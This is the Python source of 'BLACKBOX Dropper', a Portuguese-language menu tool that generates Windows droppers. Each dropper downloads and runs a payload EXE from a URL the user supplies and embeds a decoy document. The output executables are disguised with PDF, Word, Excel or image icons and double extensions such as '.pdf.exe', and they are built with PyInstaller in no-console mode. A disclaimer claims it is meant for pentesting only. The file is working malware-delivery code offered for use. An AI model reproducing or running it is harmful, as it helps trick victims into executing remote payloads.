#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# BLACKBOX Dropper v1.0
# https://github.com/Guilherme-alexander

import os
import sys
import random
import string
import subprocess

# Definições de cores
BLUE = '\033[94m'
RED = '\033[91m'
WHITE = '\033[97m'
YELLOW = '\033[93m'
MAGENTA = '\033[1;35m'
GREEN = '\033[1;32m'
END = '\033[0m'

def clear():
    """Limpa a tela do terminal para Windows e Linux"""
    os.system('cls' if os.name == 'nt' else 'clear')

def randomword(length):
    """Gera uma string aleatória"""
    return ''.join(random.choice(string.ascii_lowercase) for i in range(length))

def help_menu():
    """Exibe informações de ajuda"""
    clear()
    print(f"""{GREEN}
    ═══════════════════════════════════════════════════
    [BLACKBOX DROPPER] - Ferramenta de Pentest
    ═══════════════════════════════════════════════════{WHITE}
    
    O BLACKBOX DROPPER é uma ferramenta para criar 
    droppers que baixam e executam payloads em 
    sistemas Windows.
    
    Como usar:
    • Selecione a opção [1] para iniciar a geração
    • Escolha o tipo de dropper (PDF, WORD, EXCEL, IMAGE)
    • Forneça as URLs do seu payload e do documento
    • O dropper será compilado automaticamente
    
    Aviso: Use apenas em ambientes autorizados!
    
{BLUE}    Pressione [ENTER] para voltar ao menu
{END}""")
    input()

def banner():
    """Exibe o banner do BLACKBOX - Versão Caminhão"""
    clear()
    print(f"""{GREEN}
    ╔════════════════════════════════════════════════════════════════╗
    ║                      BLACKBOX DROPPER v1.0                     ║
    ╚════════════════════════════════════════════════════════════════╝
    {WHITE}╔═══════════════════════════════════╗{GREEN}
    {WHITE}║  📦  PACOTE ENTREGUE COM SUCESSO  ║{GREEN}
    {WHITE}╚═══════════════════════════════════╝{GREEN}
    ┌────────────────────────────────────┐
    │  ┌──────────────────────────────┐  │
    │  │  📦  👾  📦  📦  👹  📦  🕷   │  │
    │  │  📦  📦  🐞  📦  📦  📦  📦  ███████████████████████████████
    │  │  👾  📦  📦  👹  📦  👾  📦  📦  📦  👹  👾  📦  👾  👾
    │  │  📦  👹  📦  📦  🐞  📦  📦  ███████████████████████████████
    │  │  🕷   📦  📦  👾  🐞  📦  👹  │  │
    │  └──────────────────────────────┘  │
    │  │ {WHITE}DROPPER READY {GREEN}               │  │
    └────────────────────────────────────┘

        [{WHITE}1{GREEN}] {WHITE}Gerar Dropper{GREEN}        {WHITE}por:{GREEN} Guilherme Alexander
        [{WHITE}2{GREEN}] {WHITE}Ajuda{GREEN}                https://github.com/Guilherme-alexander
        [{WHITE}0{GREEN}] {WHITE}Sair{GREEN}
{END}""")

    print("Selecione uma opção do menu:\n")

def gen_menu():
    """Exibe opções de geração"""
    print(f"""{WHITE}
╔════════════════════════════════════════════════════╗
║           SELECIONE O TIPO DE DROPPER              ║
╠════════════════════════════════════════════════════╣
║  [{GREEN}1{WHITE}] PDF DROPPER    - PDF + Executável             ║
║  [{GREEN}2{WHITE}] WORD DROPPER   - DOCX + Executável            ║
║  [{GREEN}3{WHITE}] EXCEL DROPPER  - XLSX + Executável            ║
║  [{GREEN}4{WHITE}] IMAGE DROPPER  - JPG/PNG + Executável         ║
║  [{GREEN}0{WHITE}] Voltar ao menu principal                      ║
╚════════════════════════════════════════════════════╝
{END}""")

def thanks():
    """Exibe mensagem de agradecimento"""
    print(f"""{GREEN}

          OBRIGADO POR USAR [BLACKBOX DROPPER].{WHITE}
          https://github.com/Guilherme-alexander
{END}""")

def disclaimer():
    """Exibe o aviso legal"""
    clear()
    print(f"""{WHITE}
╔══════════════════════════════════════════════════════════╗
║                     BLACKBOX DROPPER                     ║
╠══════════════════════════════════════════════════════════╣
║                       [{RED}AVISO LEGAL{WHITE}]                      ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  "EM NENHUMA HIPÓTESE O DETENTOR DOS DIREITOS            ║
║   AUTORAIS OU COLABORADORES SERÃO RESPONSÁVEIS POR       ║
║   QUAISQUER DANOS DIRETOS, INDIRETOS, INCIDENTAIS,       ║
║   ESPECIAIS, EXEMPLARES OU CONSEQUENCIAIS..."            ║
║                                                          ║
║  {BLUE}USE ESTA FERRAMENTA APENAS PARA FINS{WHITE}                    ║
║  {BLUE}EDUCACIONAIS OU TRABALHO (PENTEST) !!!!!!{WHITE}               ║
║                                                          ║
║  * Um espírito nobre engrandece o menor dos homens *     ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
{END}""")
    input('\n\n           [PRESSIONE ENTER PARA CONTINUAR]')

def begin():
    """Gera o payload do dropper"""
    clear()
    print(f"""{BLUE}
╔════════════════════════════════════════════════════════╗
║              CONFIGURAÇÃO DO DROPPER                   ║
╚════════════════════════════════════════════════════════╝
{END}""")
    print('\n[!] Atenção! Coloque a URL direta! Ex: http://192.168.1.2/payload.exe')
    print('[*] Lembre-se de incluir http ou https.\n')
    
    url_d = input('📥 URL do EXE para baixar: ')
    embed_d = input('📄 URL do arquivo para embutir: ')
    
    # Detecta o tipo de arquivo pela URL
    if 'pdf' in embed_d.lower():
        nameph = randomword(10) + '.pdf'
    elif 'docx' in embed_d.lower():
        nameph = randomword(10) + '.docx'
    elif 'xlsx' in embed_d.lower():
        nameph = randomword(10) + '.xlsx'
    elif 'jpg' in embed_d.lower():
        nameph = randomword(10) + '.jpg'
    elif 'png' in embed_d.lower():
        nameph = randomword(10) + '.png'
    else:
        nameph = randomword(10) + '.pdf'
    
    # Lê o template
    with open('Templates/U_dRoP.py', 'r') as template:
        o = template.read()
    
    # Constrói o payload
    payload = '#!/usr/bin/python\n'
    payload += '# -*- coding: iso-8859-15 -*-\n'
    payload += 'import os\n'
    payload += 'from sys import exit\n'
    payload += 'import random\n'
    payload += 'try:\n'
    payload += '    from urllib.request import urlretrieve\n'
    payload += 'except ImportError:\n'
    payload += '    from urllib import urlretrieve\n'
    payload += 'from shutil import move\n'
    payload += f"url_d = '{url_d}'\n"
    payload += f"embed_d = '{embed_d}'\n"
    payload += f"nameph = '{nameph}'\n"
    payload += str(o)
    
    with open('D.py', 'w') as f:
        f.write(payload)

def build_dropper(choice):
    """Constrói o dropper com PyInstaller"""
    begin()
    
    configs = {
        '1': {
            'version': 'Resource/pdf.template',
            'icon': 'Icons/pdf.ico',
            'name': 'Blackbox_Pdf_.pdf.exe',
            'manifest': '-m Manifest/manifest.manifest'
        },
        '2': {
            'version': 'Resource/word.template',
            'icon': 'Icons/word.ico',
            'name': 'Blackbox_Word_.docx.exe',
            'manifest': '-m Manifest/manifest.manifest'
        },
        '3': {
            'version': 'Resource/excel.template',
            'icon': 'Icons/excel.ico',
            'name': 'Blackbox_Excel_.xlsx.exe',
            'manifest': '-m Manifest/manifest.manifest'
        },
        '4': {
            'version': None,
            'icon': 'Icons/img.ico',
            'name': 'Blackbox_Img_.jpg.exe',
            'manifest': ''
        }
    }
    
    config = configs.get(choice)
    if not config:
        return
    
    # Comando PyInstaller
    if sys.platform == 'win32':
        pyinstaller = 'pyinstaller'
    else:
        pyinstaller = '/root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py'
    
    cmd = f'{pyinstaller} --noconsole'
    
    if config['manifest']:
        cmd += f' {config["manifest"]}'
    
    if config['version']:
        cmd += f' --version-file={config["version"]}'
    
    cmd += f' -i {config["icon"]} -F D.py'
    
    print(f"{BLUE}[*] Construindo dropper...{END}")
    os.system(cmd)
    
    # Limpeza
    for item in ['build', 'D.spec', 'D.py']:
        if os.path.exists(item):
            if os.path.isdir(item):
                os.system(f'rm -Rf {item}' if os.name == 'posix' else f'rmdir /s {item}')
            else:
                os.remove(item)
    
    if os.path.exists('dist/D.exe'):
        os.rename('dist/D.exe', 'dist/' + config['name'])
    
    clear()
    print(f"""{GREEN}
╔════════════════════════════════════════════════════════╗
║                  ✅ DROPPER GERADO                     ║
╠════════════════════════════════════════════════════════╣
║  Arquivo: {WHITE}{config['name']}{GREEN}               ║
║  Local: {WHITE}dist/{config['name']}{GREEN}            ║
╚════════════════════════════════════════════════════════╝
{END}""")
    
    choice = input('\nDeseja sair ou voltar ao menu principal? (S/V): ')
    if choice.upper() in ['S', 'SAIR', 'Q', 'QUIT']:
        clear()
        thanks()
        sys.exit(0)

def main():
    """Loop principal do programa"""
    if os.name == 'posix' and os.geteuid() != 0:
        sys.exit('BLACKBOX deve ser executado como root')
    
    clear()
    disclaimer()
    
    while True:
        banner()
        
        try:
            header = f'{GREEN} BLACKBOX >> {END}'
            choice = input(header)
            
            # Menu principal
            if choice == '0':
                clear()
                thanks()
                sys.exit(0)
            elif choice == '2':
                help_menu()
            elif choice == '1':
                # Submenu de geração
                while True:
                    gen_menu()
                    sub_choice = input(f'{GREEN} BLACKBOX >> {END}')
                    
                    if sub_choice == '0':
                        break
                    elif sub_choice in ['1', '2', '3', '4']:
                        build_dropper(sub_choice)
                        break
                    else:
                        print(f'\n{RED}[!] Opção inválida!{END}\n')
            else:
                print(f'\n{RED}[!] Opção inválida! Use 0, 1 ou 2{END}\n')
                
        except KeyboardInterrupt:
            clear()
            thanks()
            sys.exit(0)

if __name__ == '__main__':
    main()
